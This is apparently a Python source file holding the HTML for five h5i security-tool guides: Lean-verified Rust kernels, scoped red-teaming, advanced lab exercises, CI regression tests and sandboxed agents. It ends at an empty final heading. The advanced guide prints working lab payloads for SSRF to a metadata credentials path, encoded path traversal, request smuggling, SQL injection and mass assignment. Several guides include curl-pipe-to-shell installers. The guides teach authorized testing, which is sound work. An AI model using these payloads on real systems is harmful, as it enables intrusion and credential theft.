"""The five canonical task guides shown on the Guides landing page."""

from html import escape


def code_block(source, language="bash"):
    return f'<pre><code class="language-{language}">{escape(source)}</code></pre>'


KERNEL_WRITE = """// From the calculator kernel's transition match:
Command::Set { value } => Ok((
    Some(Memory { user: actor.user, value: *value }),
    Reply::Value(*value),
)),"""

KERNEL_SUBTRACT = """// From the calculator kernel's compute match:
Op::Sub => {
    if a < b {
        Err(Error::Underflow)
    } else {
        Ok(a - b)
    }
}"""

LEAN_SPEC = """-- proofs/Spec.lean: the intended arithmetic
def eval : Op → Nat → Nat → Except Error Nat
  | .Add, a, b => if a + b < 2 ^ 64 then .ok (a + b) else .error .Overflow
  | .Sub, a, b => if b ≤ a then .ok (a - b) else .error .Underflow
  | .Mul, a, b => if a * b < 2 ^ 64 then .ok (a * b) else .error .Overflow
  | .Div, a, b => if b = 0 then .error .DivByZero else .ok (a / b)"""

LEAN_THEOREM = """-- proofs/Proofs.lean: a successful command writes only the caller's row
theorem writes_own_memory (a : Principal) (s : Snapshot) (c : Command) :
    transition a s c ⦃ r => ∀ w reply, r = .Ok (w, reply) →
      ∀ m, w = some m → m.user = a.user ⦄ := by
  unfold transition
  cases c <;> step* <;> (try split) <;> simp_all"""

BOX_POLICY = """# .h5i/env.toml
[profile.review]
isolation = "supervised"

[profile.review.fs]
read  = ["/usr", "/etc"]
write = ["$WORK"]

[profile.review.net]
mode   = "deny"
egress = ["api.github.com"]
unix   = false

[profile.review.resources]
mem   = "4G"
procs = 256
wall  = "30m"""

CI_TEST_STEP = """# Inside a GitHub Actions job that can reach staging:
- name: Replay security regression tests
  env:
    ALICE_TOKEN: ${{ secrets.STAGING_ALICE_TOKEN }}
  run: |
    curl -fsSL https://h5i.dev/install.sh | sh -s -- --test
    h5i test .h5i-tests/tests/post-ownership.yaml --target https://staging.example.com"""

ADV_RAW_REQUEST = r"""# Lab 30: write the exact HTTP/1 bytes before replaying them.
python3 - <<'PY'
from pathlib import Path

host = "127.0.0.1:9300"
body = f"0\r\n\r\nGET /admin/flag HTTP/1.1\r\nHost: {host}\r\n\r\n".encode()
head = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Type: text/plain\r\nContent-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n\r\n").encode()
Path("desync.http").write_bytes(head + body)
PY
h5i websec replay req_0 --session lab30 --raw-request ./desync.http
# Use the response ID printed by replay; inspect every response in the raw record.
h5i websec show res_1 --session lab30 --raw"""

ADV_CHAIN_FLOW = r"""{
  "steps": [
    {"name": "log in", "resend": 0, "create": true,
     "set": ["method=POST", "path=/api/login",
             "header.Content-Type=application/json",
             "json.user=${user}", "json.password=${password}"]},
    {"name": "get a fresh token", "resend": 0, "create": true,
     "set": ["method=GET", "path=/account/settings"],
     "extract": {"csrf": "regex:name=\"csrf\" value=\"([^\"]+)\""}},
    {"name": "submit a field the form did not offer", "resend": 0, "create": true,
     "set": ["method=POST", "path=/account/settings",
             "header.Content-Type=application/x-www-form-urlencoded",
             "form.display_name=Guest", "form.csrf=${csrf}",
             "form.role=admin"]},
    {"name": "check the new role", "resend": 0, "create": true,
     "set": ["method=GET", "path=/admin/flag"]}
  ]
}"""


BUILD_VERIFY = {
    "section": "guides", "slug": "build-and-verify-a-web-app",
    "published": "2026-10-21", "eyebrow": "Guide 01 / Framework",
    "time": "10 min", "tags": "Rust &middot; Axum &middot; Lean 4",
    "title": "Rust Formal Verification with Lean 4 | h5i",
    "h1": "Build and Verify a Web App",
    "description": "Learn how to verify a Rust web app with Lean 4: extract a Rust decision kernel with Charon and Aeneas, prove a property, then test the proof with mutations.",
    "deck": "Build the application in Rust, then make the rule you care about explicit enough for Lean 4 to check it. The small kernel is where implementation and proof meet.",
    "body": f"""<div class="callout"><strong>Outcome.</strong> Create an h5i-app project, identify the Rust logic that needs a proof, run extraction and proof checks, and use an intentional mutation to test whether the specification notices a bug.</div>
<figure class="feature-figure"><img src="/_static/calculator-rust-lean-proof.svg" alt="A Rust calculator kernel is extracted into Lean definitions, checked against a handwritten specification, and tested with mutations"><figcaption>The Rust kernel is the implementation; the Lean specification states the intended rule.</figcaption></figure>
<p>Tests can show what happened for chosen inputs. A theorem can state a rule over every input covered by its model. For a web app, that rule might say a user can only change their own record, a balance cannot become negative, or a state transition preserves an invariant. The proof is useful only when it describes the Rust that actually runs and when its assumptions are understood.</p>
<h2 id="architecture">1. Put application decisions in a Rust kernel</h2>
<p>h5i-app uses Axum for HTTP and a separate kernel for application decisions. The handler authenticates a request and passes the actor, current state, and command to the kernel. The kernel returns a proposed write and reply, or a refusal. Keeping HTTP and database access out of this function gives the translation toolchain a focused Rust program to model in Lean 4.</p>
{code_block('HTTP request → Axum handler → Rust kernel(actor, snapshot, command)\n                                  ↓\n                       write + reply, or refusal', 'text')}
<p>The <a href="https://github.com/h5i-dev/h5i/blob/main/examples/app/calculator/TUTORIAL.md">calculator example</a> stores one memory value per user. Its <code>transition</code> function decides whether an operation is valid and which row may change. The same shape works for authorization, tenant isolation, and business workflows.</p>
{code_block(KERNEL_WRITE, 'rust')}
<p>This branch constructs a write for <code>actor.user</code>. The caller's identity comes from the handler, while the command supplies only the new value. The full <code>transition</code> also handles arithmetic and reads.</p>
<h2 id="scaffold">2. Scaffold a project</h2>
{code_block('h5i app new counter\ncd counter\nh5i app doctor')}
<p>The new project has a Rust kernel, a <code>proofs/</code> directory, and <code>h5i-app.toml</code> to describe extraction and proof targets. <code>doctor</code> checks the pinned Charon, Aeneas, and Lean toolchain. If you already have a Rust project, <code>cargo add h5i-app</code> adds the framework, but you still need a kernel and proof project; the <a href="/manual/#h5i-app">app manual</a> describes that layout.</p>
<h3 id="existing-rust-project">Starting with an existing Rust web app</h3>
<p>Choose one decision that can be expressed without HTTP or database I/O, such as whether an authenticated actor may update a row. Put that function and its input types in a kernel crate, then call it from the existing Axum handler. Keep authentication and persistence in the handler: a Lean theorem about the kernel cannot establish that the handler supplied the correct actor or applied only the returned writes.</p>
<p>Give the project a <code>proofs/</code> Lake workspace and an <code>h5i-app.toml</code>. The manifest names Charon start points and the Lean theorems that must pass; the <a href="https://github.com/h5i-dev/h5i/blob/main/examples/app/calculator/h5i-app.toml">calculator manifest</a> is a concrete example. Scaffold a small project first if you need a working proof layout to copy, then replace its kernel with the decision from your app. Run <code>h5i app doctor</code> before extraction so missing or mismatched toolchain versions are visible.</p>
<p>The translation path is Rust kernel → Charon intermediate representation → Aeneas-generated Lean definitions → your handwritten Lean specification and proof. Extraction is not itself a proof. If a dependency or Rust feature is unsupported, narrow the kernel boundary or model that dependency explicitly; do not treat an incomplete translation as a verified app.</p>
<h2 id="specification">3. State the property before proving it</h2>
<p>Decide which rule must hold. In the calculator, a useful property is that a successful command writes only the caller's memory. Another is that an arithmetic operation either returns its mathematical result or the specified refusal. Write the rule in the Lean specification, then prove it about the extracted kernel. A proof of the wrong rule is still a valid proof, so review the specification as carefully as the Rust code.</p>
<p>For example, the Rust kernel refuses subtraction that would underflow:</p>
{code_block(KERNEL_SUBTRACT, 'rust')}
<p>The handwritten Lean specification expresses the same rule over natural numbers. It is deliberately simpler than the implementation, so a reviewer can check what the proof is supposed to establish.</p>
{code_block(LEAN_SPEC, 'lean')}
<p>Charon extracts the Rust kernel into an intermediate form and Aeneas emits Lean definitions under <code>proofs/generated/</code>. Keep handwritten theorems outside that generated directory. This avoids maintaining a second handwritten implementation that could drift from Rust.</p>
<h2 id="prove">4. Extract and check the proofs</h2>
{code_block('h5i app extract\nh5i app prove')}
<p><code>extract</code> refreshes the Lean model. <code>prove</code> runs extraction and checks the configured proof targets. One theorem in the calculator connects the extracted <code>transition</code> to the ownership rule:</p>
{code_block(LEAN_THEOREM, 'lean')}
<p>The theorem covers every command case in this model, including the arithmetic branch. In CI, <code>h5i app extract --check</code> verifies that committed generated files match the current Rust kernel without rewriting them. Run the application's ordinary tests too: they exercise adapters and deployments that a kernel proof does not cover.</p>
<h2 id="mutate">5. Make the proof fail on purpose</h2>
{code_block('h5i app lint\nh5i app mutate')}
<p><code>lint</code> checks route authentication structure. <code>mutate</code> changes the kernel in a temporary copy and rebuilds the proofs. A mutation that survives identifies behavior the present specification has not pinned down. For example, changing a subtraction boundary from <code>a &lt; b</code> to <code>a &lt;= b</code> should break a theorem that specifies the equal case. Review a surviving mutation before adding a property; it may also be irrelevant to the intended contract.</p>
<h2 id="boundary">What the proof covers</h2>
<p>Lean checks stated properties of the extracted kernel under explicit assumptions. It does not automatically prove authentication adapters, the PostgreSQL implementation, deployment configuration, or GPU execution. Read the <a href="https://github.com/h5i-dev/h5i/blob/main/docs/app/TRUST.md">verification trust model</a> and test the running application as a separate step. The optional <a href="https://github.com/h5i-dev/h5i/blob/main/docs/app/GPU.md">GPU backend</a> is checked with CPU/GPU differential tests, not by the Lean kernel proof.</p>
<h2 id="further-reading">Go deeper</h2>
<p>This guide follows the workflow in the author's <a href="https://qiita.com/Koukyosyumei/items/dfcdc41ecd5b3c2388c0">Japanese h5i-app walkthrough</a>. For runnable source and complete Lean theorems, continue with the <a href="https://github.com/h5i-dev/h5i/blob/main/examples/app/calculator/TUTORIAL.md">calculator tutorial</a> and the <a href="https://github.com/h5i-dev/h5i/blob/main/crates/h5i-app/README.md">framework README</a>.</p>""",
    "next": ("/guides/red-team-a-web-app/", "Next guide", "Red-Team a Web App", "Test the running application after proving the properties you can state."),
    "cta": ("Start with a property you care about", "Keep the Rust kernel and its Lean specification small enough to review together.", "/manual/#h5i-app", "Read the app manual"),
}


RED_TEAM = {
    "section": "guides", "slug": "red-team-a-web-app",
    "published": "2026-10-21", "eyebrow": "Guide 02 / Red-teaming",
    "time": "10 min", "tags": "Browser &middot; Recon &middot; HTTP replay",
    "title": "Red-team a web app with h5i | h5i",
    "h1": "Red-Team a Web App",
    "description": "Use a scoped browser session, reconnaissance, and HTTP replay to investigate access control and authentication bugs in a running web app.",
    "deck": "A proof addresses the rule you stated. This workflow investigates the deployed app for the routes, identities, and edge cases you did not anticipate.",
    "body": f"""<div class="callout"><strong>Outcome.</strong> Open a scoped browser session, build an endpoint inventory, change one captured request, and decide what the response does and does not establish.</div>
<figure class="feature-figure"><img src="/_static/agent-audit-target.svg" alt="An agent browser reaches an authorized target through a policy and request record"><figcaption>Keep the scope, browser actions, HTTP evidence, and interpretation separate throughout the test.</figcaption></figure>
<p>Use these tools only for an application you own or have explicit permission to test. Record the allowed hosts, accounts, techniques, rate, and time window first. The browser policy can restrict destinations; it cannot grant authorization.</p>
<h2 id="prepare">1. Install the tools and open a scoped session</h2>
{code_block('curl -fsSL https://h5i.dev/install.sh | sh -s -- --websec --recon\nh5i browser open https://target.example --allow target.example\nh5i browser status')}
<p>Replace <code>target.example</code> with an allowed origin. The browser session records the traffic it sends and the policy decisions that permit or refuse requests. Captured messages may contain credentials or personal data, so treat them as sensitive test evidence.</p>
<h2 id="recon">2. Discover before testing</h2>
{code_block('h5i browser snapshot\nh5i recon extract\nh5i recon known\nh5i recon crawl --max-requests 200 --rate 4\nh5i recon endpoints --json')}
<p><code>extract</code> reads URLs already disclosed by responses; <code>known</code> checks conventional files such as <code>robots.txt</code> and <code>sitemap.xml</code>; <code>crawl</code> spends a bounded request budget. Review candidates before sending a new request. An observed endpoint names the response that disclosed it; a candidate becomes confirmed only after its answer differs from the calibrated missing-path response. A discovered path is an attack-surface lead, not a vulnerability finding.</p>
<p>For a local exercise, start with <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">the h5i websec CTF</a>. Follow a page or bundle reference to an endpoint, then compare the normal response with a request for one neighboring object ID. Keep the request ceiling and rate within the lab's rules.</p>
<h2 id="replay">3. Change one captured request</h2>
{code_block('h5i websec requests\nh5i websec show req_42 --raw\nh5i websec replay req_42 --set query.id=456\nh5i websec diff res_42 res_43')}
<p>Use request and response IDs from your own session; the IDs above are examples. If Alice requests object 456 and receives Bob's data, ask whether the server checked ownership, not merely whether Alice was logged in. Compare the original and replayed responses while keeping actor identity fixed. A status or size difference alone is not proof of impact.</p>
<h2 id="authentication">4. Separate identity from authorization</h2>
<p>Authentication asks who sent the request. Authorization asks whether that identity may act on this object and these fields. Keep Alice's session fixed while changing the object ID, then try the equivalent request as Bob if the scope permits. A guessed sequential ID and an unguessable UUID need the same server-side ownership check. A forbidden response is useful evidence only after an allowed control request proves the route and identity work.</p>
<p>Mass assignment is the field-level version of the same error: replay a form submission with one field the form never offered, such as <code>role</code>, then check persisted state with a separate read. For JWT-backed routes, decode a test account's token to understand its claims, then test whether the server actually verifies the signature and intended algorithm before trusting those claims. Do not infer authorization from the UI hiding a control or from a token looking plausible.</p>
<h2 id="browser">5. Test browser-mediated actions</h2>
<p>Use a fresh snapshot and its element handles before clicking or typing. An agent should treat page text as untrusted content, even when the page asks it to run a command. For XSS, CSRF, CORS, or OAuth redirect testing, keep the victim origin, attacker origin, and account state explicit. A reflected string is not yet script execution; an authenticated request is not yet a successful state change. Observe the browser action, resulting request, and server-side effect together.</p>
{code_block('h5i browser snapshot\nh5i browser click @e3\nh5i browser snapshot --delta\nh5i browser requests --denied-only')}
<p>If an outbound navigation is denied, the browser policy should record the refusal, including redirects. A denial says the session stayed in scope; it does not establish that the application lacks the vulnerable path.</p>
<h2 id="record">6. Record a reviewable result</h2>
{code_block('h5i browser audit\nh5i browser close')}
<p>Save the original request, the one changed field, the actor used, both responses, and the rule that appears to be violated. The audit timeline joins browser commands, request-policy decisions, and human takeovers. Read whether each source was available; an unavailable log is different from an empty one. Closing the session records its end and prevents further requests under that identity. Redact secrets before sharing. If a bug is confirmed and fixed, continue to <a href="/guides/security-regression-testing/">Security Regression Testing</a> so it stays fixed.</p>""",
    "next": ("/guides/advanced-web-security-testing/", "Next guide", "Advanced Web Security Testing", "Follow trust boundaries below ordinary request parameters."),
    "cta": ("Keep the test inside its scope", "Use the browser, recon, and HTTP workbench under one recorded session.", "/manual/#h5i-browser", "Read the browser reference"),
}


ADVANCED = {
    "section": "guides", "slug": "advanced-web-security-testing",
    "published": "2026-10-21", "eyebrow": "Guide 03 / Advanced testing",
    "time": "14 min", "tags": "SSRF &middot; HTTP protocol &middot; Exploit chains",
    "title": "Advanced web security testing with h5i | h5i",
    "h1": "Advanced Web Security Testing",
    "description": "Investigate SSRF, HTTP protocol flaws, business logic, and multi-request exploit chains with captured traffic and bounded experiments.",
    "deck": "When changing one parameter is not enough, trace the boundary the request crosses and the state each later request depends on.",
    "body": f"""<div class="callout"><strong>Outcome.</strong> Turn a suspicious response into a bounded hypothesis about a trust boundary, then keep the requests needed to reproduce or reject it.</div>
<p>Run the exercises in the linked local CTF labs or against systems you are explicitly authorized to test. Advanced techniques can reach internal services, alter shared caches, or send many requests. Choose targets and budgets deliberately.</p>
<p>To run the recipes below, start from the <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">local websec CTF</a>. Each numbered lab is a deliberately vulnerable application; start the named lab and open the URL shown before replaying its captured <code>req_0</code>. Install the <code>websec</code> plugin if <code>h5i websec --help</code> says it is unavailable.</p>
{code_block('git clone https://github.com/h5i-dev/h5i-tutorial.git\ncd h5i-tutorial/websec\nh5i plugin install websec\nh5i websec --help')}
<div class="tbl-wrap"><table class="data"><thead><tr><th>Boundary</th><th>Question</th><th>Evidence to keep</th></tr></thead><tbody><tr><th>Server fetch or file</th><td>Where did the input make the server connect or read?</td><td>Baseline, destination, refusal, or file effect</td></tr><tr><th>HTTP protocol</th><td>Did peers parse the same bytes differently?</td><td>Raw request and each observed response</td></tr><tr><th>Multi-request state</th><td>Which earlier value made the later request succeed?</td><td>Actors, cookies, extracted values, and sequence</td></tr></tbody></table></div>
<h2 id="ssrf">1. Trace server-side fetches and files</h2>
<p>For SSRF, the question is whether attacker-controlled input makes the server request a destination outside its intended authority. Inspect where the URL came from, how redirects are followed, and whether the response or an out-of-band effect reveals the fetch. Path traversal, uploads, and local file inclusion cross a similar boundary from a web input into the server's filesystem.</p>
<p>In lab 25, open the link-preview route to capture the baseline, then change only the URL the server fetches. The second destination is reachable from that lab server; your browser session remains scoped to loopback. Inspect the response ID printed by replay and compare it with the baseline:</p>
{code_block("./run.sh 25\nh5i browser open 'http://127.0.0.1:9250/api/preview?url=http://127.0.0.1:9251/' --session lab25 --new --allow 127.0.0.1\nh5i websec replay req_0 --session lab25 --set query.url=http://127.0.0.1:9251/latest/meta-data/iam/security-credentials/\nh5i websec show res_1 --session lab25 --raw")}
<p>Try alternate address spellings only inside the local lab or an authorized scope. A failed fetch may mean a filter worked, a destination was unreachable, or the session policy refused the experiment; those are different outcomes. If the response yields a path, test only the path needed to confirm the hypothesis.</p>
<p>For path traversal, first show what ordinary replay sends, then preserve the encoded request target byte for byte. Lab 27 strips a plain <code>../</code> before another layer decodes the value:</p>
{code_block("./run.sh 27\nh5i browser open 'http://127.0.0.1:9270/download?file=welcome.md' --session lab27 --new\nh5i websec replay req_0 --session lab27 --set 'query.file=%252e%252e%252fsecret%252fflag.txt'\nh5i websec replay req_0 --session lab27 --raw-target '/download?file=%252e%252e%252fsecret%252fflag.txt'")}
<p>Compare the two sent requests and responses. The difference tells you whether client normalization changed the payload before it reached the app. For uploads and local file inclusion, verify the final opened or written path rather than inferring it from a successful HTTP status.</p>
<h2 id="protocol">2. Inspect request framing and shared state</h2>
<p>Request smuggling asks whether two HTTP peers disagree on where one request ends. In lab 30, the edge trusts <code>Content-Length</code> while the backend honors chunked encoding. Start and capture the local target, write the request file, then replay its exact bytes:</p>
{code_block("./run.sh 30\nh5i browser open 'http://127.0.0.1:9300/' --session lab30 --new")}
{code_block(ADV_RAW_REQUEST)}
<p><code>--raw-request</code> matters because an ordinary HTTP client would rewrite the framing headers and erase the experiment. CRLF injection and host-header poisoning instead ask whether an input becomes a header or an absolute URL. Cache poisoning asks whether a shared cache omits that influence from its key. Use a control request and a second client view before calling any of these a finding. Do not infer smuggling or cache impact from one anomalous status.</p>
<p>For a header or cache hypothesis, change one header on a captured control request and compare the resulting responses:</p>
{code_block('h5i websec replay req_0 --session lab33 --set header.X-Forwarded-Host=example.test\nh5i websec diff res_0 res_1 --session lab33\nh5i websec show req_1 --session lab33 --raw')}
<p>Run <code>./run.sh 33</code> and open <code>http://127.0.0.1:9330/</code> as <code>lab33</code> first. A reflection in one response is only a lead; determine whether a second client receives the changed cached response. Repeat within the permitted rate and record which component produced each answer.</p>
<h2 id="chains">3. Carry values across requests</h2>
<p>An exploit chain often needs a value learned from one response in a later request: a token, object ID, redirect target, or freshly created resource. Write down the actor and state at each step. A result from a single replay may disappear when cookies, timing, or application state change. Use a sequence or a versioned <code>h5i test</code> flow when reproducibility matters.</p>
<p>In lab 41, an update needs a fresh CSRF token. Create <code>flow.json</code> with login, token extraction, and form submission. The third step sends an extra <code>role</code> field that the form never offered:</p>
{code_block(ADV_CHAIN_FLOW, 'json')}
{code_block("./run.sh 41\nh5i browser open 'http://127.0.0.1:9410/' --session lab41 --new\nh5i websec sequence flow.json --session lab41 --var user=guest --var password=guest")}
<p>The sequence satisfies CSRF and tests field authorization. Check the step outputs and then read the resulting account state; a successful POST alone is insufficient. Record each actor, cookie jar, extracted value, and changed field. Turn a confirmed chain into a versioned <code>h5i test</code> flow rather than relying on a one-off shell history.</p>
<h2 id="other-boundaries">4. Check interpreter and workflow boundaries</h2>
<p>SQL, NoSQL, shell, templates, and XML parsers have different syntax, but the same review question: did untrusted data become an instruction for another interpreter? Use a harmless local control to establish the parser and the exact sink before testing a stronger hypothesis. Error-based, boolean, and timing observations need different controls; timing especially needs repeated measurements and a stable baseline.</p>
<p>In lab 12, capture a normal product search and send one quote. Then compare true and false predicates with the same prefix; a syntax error alone does not establish control of the query's logic:</p>
{code_block("./run.sh 12\nh5i browser open 'http://127.0.0.1:9120/api/products?q=compass' --session lab12 --new\nh5i websec replay req_0 --session lab12 --set \"query.q=compass'\"\nh5i websec replay req_0 --session lab12 --set \"query.q=compass%' AND '1'='1' -- \"\nh5i websec replay req_0 --session lab12 --set \"query.q=compass%' AND '1'='2' -- \"")}
<p>Business-logic bugs cross a state boundary instead of a parser boundary. Race a check-then-act operation only within an agreed request budget; test whether individually valid coupons compound beyond the intended limit; check whether a second authentication step can be skipped by replaying a later request. Predictable recovery tokens and unsafe signed deserialization are separate mechanisms. For each, state the expected invariant, the sequence that may violate it, and the server-side state that would establish impact.</p>
<p>For a state example, lab 36 accepts a list of coupons. Compare one valid coupon with a duplicate list and then inspect the resulting checkout total:</p>
{code_block("./run.sh 36\nh5i browser open 'http://127.0.0.1:9360/' --session lab36 --new\nh5i websec replay req_0 --session lab36 --create --set method=POST --set path=/api/checkout --set header.Content-Type=application/json --set json.item=enterprise-license --set 'json.coupons=[\"FRIEND25\"]'\nh5i websec replay req_0 --session lab36 --create --set method=POST --set path=/api/checkout --set header.Content-Type=application/json --set json.item=enterprise-license --set 'json.coupons=[\"FRIEND25\",\"FRIEND25\"]'")}
<h2 id="finish">5. Separate evidence from impact</h2>
<p>Keep the baseline, each changed request, the response or side effect, and the rule you believe was crossed. A response difference is a lead, not an automatic vulnerability verdict. If bytes are the experiment, inspect the sent request; if state is the experiment, preserve the whole sequence and its actors:</p>
{code_block('h5i websec requests --session lab41\nh5i websec show req_1 --session lab41 --raw\nh5i websec show res_1 --session lab41 --raw\nh5i browser audit --session lab41')}
<p>Use the IDs actually printed by your run. The <a href="/manual/#h5i-websec">manual</a> defines exact edit and replay options. When a result is confirmed, encode the smallest repeatable flow as a regression test.</p>""",
    "next": ("/guides/security-regression-testing/", "Next guide", "Security Regression Testing", "Turn a confirmed finding into a durable CI verdict."),
    "cta": ("Make each experiment reviewable", "Keep the request bytes, actors, and state transitions that support the finding.", "/manual/#h5i-websec", "Open the HTTP reference"),
}


REGRESSION = {
    "section": "guides", "slug": "security-regression-testing",
    "published": "2026-10-21", "eyebrow": "Guide 04 / CI/CD",
    "time": "8 min", "tags": "h5i test &middot; Verdicts &middot; API coverage",
    "title": "Security regression testing in CI/CD with h5i | h5i",
    "h1": "Security Regression Testing",
    "description": "Turn a confirmed web vulnerability into a versioned h5i test, give it an explicit verdict, and replay it against staging in CI/CD.",
    "deck": "A finding is most useful when the repaired application can demonstrate, on every build, that the same attack flow no longer works.",
    "body": f"""<div class="callout"><strong>Outcome.</strong> Write a versioned test for a confirmed access-control bug, run it against staging, and make the CI result distinguish pass, failure, and an undecidable error.</div>
<p>Begin with evidence from a permitted test: the request, the actor, the response, and the security property the fix should enforce. Do not encode a response status just because it appeared once; choose the condition that means the vulnerability is blocked.</p>
<div class="tbl-wrap"><table class="data"><thead><tr><th>Result</th><th>What it means</th><th>CI action</th></tr></thead><tbody><tr><th>Pass</th><td>The stated expectation held for this run.</td><td>Keep the evidence with the job.</td></tr><tr><th>Fail</th><td>The application contradicted the security expectation.</td><td>Investigate the regression.</td></tr><tr><th>Error</th><td>The test could not decide, for example because setup failed.</td><td>Fix the run; do not count it as a pass.</td></tr></tbody></table></div>
<h2 id="write">1. Save the flow with an explicit expectation</h2>
<p>Tests live under <code>.h5i-tests/tests/</code> and use <code>version: h5i.test/v1</code>. This example assumes Alice can read post 41 but must not read Bob's post 42. Supply the token as a CI secret rather than committing it.</p>
{code_block('version: h5i.test/v1\nid: post-ownership\nname: Alice cannot read Bob\nactors:\n  alice: {}\nrequests:\n  own_post:\n    path: /api/posts/41\n    headers:\n      authorization: Bearer ${env.ALICE_TOKEN}\n  other_post:\n    path: /api/posts/42\n    headers:\n      authorization: Bearer ${env.ALICE_TOKEN}\nflow:\n  - send: own_post\n    as: alice\n    expect:\n      status: 200\n  - send: other_post\n    as: alice\n    expect:\n      status: 403', 'yaml')}
<p>The first request confirms the actor is authenticated and the route works; the second checks ownership. For a property the built-in response checks cannot express, use an oracle. A test with neither an expectation nor an oracle is refused.</p>
<h2 id="run">2. Run it against staging</h2>
{code_block('h5i plugin install test\nh5i test .h5i-tests/tests/post-ownership.yaml --target https://staging.example.com')}
<p>Commit the test with the application fix. Give CI a staging target and an identity with only the permissions needed. For example, add this step to a job that deploys a disposable staging build and waits for it to become ready:</p>
{code_block(CI_TEST_STEP, 'yaml')}
<p>A failed property is different from an execution error; h5i does not turn an undecidable result into a pass. Review the recorded result and response artifacts when a job fails. Keep the staging token in the CI secret store and ensure the target uses test data that can be reset between runs.</p>
<h2 id="coverage">3. Check API coverage deliberately</h2>
<p>When the project has an OpenAPI description, <code>h5i test --openapi openapi.json</code> reports which declared operations the completed tests cover. Add <code>--min-coverage</code> only after reviewing the denominator and the operation mapping. A test that errored does not count as covered; a response assertion still has to express the security property.</p>
<h2 id="extend">4. Keep the test maintainable</h2>
<p>Use named actors and separate cookie jars for multi-user flows. Extract values from earlier responses when IDs change across runs. Keep setup and cleanup distinct from the verdict, and let cleanup failures remain visible. The <a href="/manual/#h5i-test">h5i test manual</a> defines the schema, oracle environment, and CI output. A complete checked-in example is the <a href="https://github.com/h5i-dev/h5i/blob/main/docs/demo/.h5i-tests/tests/board-auth.yaml">board authorization test</a>.</p>""",
    "next": ("/guides/sandboxed-agent-workflows/", "Next guide", "Sandboxed Agent Workflows", "Run agent work and untrusted code under an explicit boundary."),
    "cta": ("Keep confirmed bugs fixed", "Save the security property as a test next to the application code.", "/manual/#h5i-test", "Read the test reference"),
}


SANDBOX = {
    "section": "guides", "slug": "sandboxed-agent-workflows",
    "published": "2026-10-21", "eyebrow": "Guide 05 / Agent workflows",
    "time": "15 min", "tags": "Sandbox &middot; Policy &middot; Dashboard",
    "title": "Sandbox agent workflows with h5i | h5i",
    "h1": "Sandboxed Agent Workflows",
    "description": "Run agent tools and untrusted pull requests in an h5i box, set file and network policy, and review activity in the local dashboard.",
    "deck": "An agent task runs code long before it proposes a patch. Give the whole task a boundary, then inspect what happened before accepting its output.",
    "body": f"""<div class="callout"><strong>Outcome.</strong> Create a disposable box for a coding task, define and inspect its policy, run the agent and tests inside it, review a pull request without giving it your checkout, and export the evidence before accepting a patch.</div>
<figure class="feature-figure"><img src="/_static/fast-supervised-sandbox.svg" alt="An agent, repository, tools, dev server, and browser execute inside one policy-controlled box"><figcaption>The task runs inside one resolved boundary; the patch and execution record leave through review.</figcaption></figure>
<p>Use a box when agent-written or untrusted code will execute. The unit of isolation is the whole task: agent, repository, package scripts, tools, dev server, and browser. A clean final diff says nothing about what an install hook tried to read or contact. Begin with a Git repository whose baseline you recognize, and choose one agent runtime for the box.</p>
<h2 id="create">1. Check the host and create a local box</h2>
{code_block('curl -fsSL https://h5i.dev/install.sh | sh\nh5i box probe\nh5i box create first-box --from HEAD --profile agent-claude\nh5i box status first-box')}
<p><code>probe</code> tests what this host can enforce. <code>create</code> freezes the base revision and resolves the profile before starting work. In <code>status</code>, check the selected isolation tier, whether the box shares the host kernel, writable paths, network destinations, resource limits, and policy digest. An explicit unavailable tier fails rather than silently changing tiers. For Codex, use <code>agent-codex</code> instead of <code>agent-claude</code>.</p>
<h2 id="work">2. Run the task and read its execution record</h2>
{code_block('h5i box shell first-box\n# Inside the box: run the agent, build, and tests.\nexit\nh5i box run first-box -- cargo test\nh5i box diff first-box\nh5i box log first-box')}
<p>The shell is the boundary for its child processes, including test runners and install scripts. <code>box run</code> is useful for a single repeatable command. Review the diff for what changed and the log for what ran, including failed tests and denied requests. A patch alone cannot establish that a test executed. When the task needs a service, start it in the same box session rather than silently relying on a host service.</p>
<h2 id="policy">3. Check in a policy for repeatable work</h2>
<p>Put the permissions in <code>.h5i/env.toml</code> so reviewers can see the intended boundary. This profile grants a workspace write path, denies other network destinations, and permits one API host:</p>
{code_block(BOX_POLICY, 'toml')}
{code_block('h5i box create policy-check --from HEAD --profile review\nh5i box status policy-check\nh5i box doctor policy-check\nh5i box rm policy-check')}
<p><code>$WORK</code> is the box workspace. The exact filesystem grants depend on the runtime and host; inspect the resolved policy with <code>status</code> and <code>doctor</code> before using it for a task. Add a registry destination only when the build actually needs it. A denied telemetry request is not a reason to allow all egress. If the profile changes, create a new box: an existing box keeps the policy resolved at its creation.</p>
<p>Credentials are separate grants. Check <code>h5i box secrets first-box</code> for resolution state without printing values. Do not copy a host home directory or place a real service token in inherited environment variables. The <a href="/manual/#policy">policy manual</a> explains the available fields and tier-specific enforcement. In particular, a hostname allowlist at the container tier relies on an HTTP proxy, while supervised and microVM tiers enforce at the network layer; read the reported tier before making a containment claim.</p>
<h2 id="pull-request">4. Review an untrusted pull request in a detached box</h2>
{code_block('h5i box create review-1234 --pr 1234 --profile agent-claude\nh5i box status review-1234\nh5i box secrets review-1234\nh5i box shell review-1234\n# Inside the box: install from the lockfile and run the relevant tests.\nexit\nh5i box diff review-1234\nh5i box log review-1234')}
<p>The host fetches and pins the PR head; the box receives an independent repository without the inherited <code>origin</code> remote or your GitHub credential. Confirm <code>status</code> says the box is detached before running package scripts. Use the project's real install and test commands, then inspect denied destinations, exit codes, browser errors, and the patch in that order. A detached PR box cannot use the local <code>propose</code>/<code>apply</code> path; that refusal prevents an accidental landing in the parent checkout.</p>
<h2 id="dashboard">5. Observe browser work and take control when needed</h2>
{code_block('h5i box create browser-demo --from HEAD --profile browser\nh5i box shell browser-demo\n# Inside the box: start the dev server and browser; keep this shell open.')}
<p>In another host terminal, start the viewer and dashboard, then take and release browser control when the human must handle a step:</p>
{code_block('h5i box view browser-demo\nh5i browser take browser-demo\n# Interact in the viewer, then return control.\nh5i browser release browser-demo\nh5i ui')}
<p>Keep the box session alive while viewing its browser and dev server. The local dashboard shows sessions and activity; the viewer shows the page and allows a human takeover. A takeover invalidates the agent's old page handles, so it must take a fresh snapshot afterward. Use a fresh browser profile inside the box rather than importing daily cookies, extensions, and saved credentials. The viewer and dashboard help you observe work; the box policy remains the isolation boundary.</p>
<h2 id="export">6. Export, decide, and remove the box</h2>
